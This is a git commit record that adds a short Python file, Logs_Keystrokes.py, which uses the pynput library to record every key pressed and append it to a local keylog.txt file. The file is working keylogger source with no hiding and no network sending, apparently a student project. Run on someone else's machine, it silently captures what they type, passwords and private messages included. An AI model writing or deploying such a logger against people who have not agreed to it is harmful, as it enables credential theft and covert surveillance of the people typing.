7f949dc4ee37de40c31b650decc317b570fe74e6
Jeetu Yadav <jeetu.yadav1@s.amity.edu>
2025-06-13 14:21:42 +0530

    Add files via upload

---
+++ Logs_Keystrokes.py
@@ -0,0 +1,16 @@
+from pynput import keyboard
+
+# File to store keystrokes
+log_file = "keylog.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open(log_file, "a") as f:
+            f.write(f" [{key}] ")
+
+# Start listening to keyboard
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
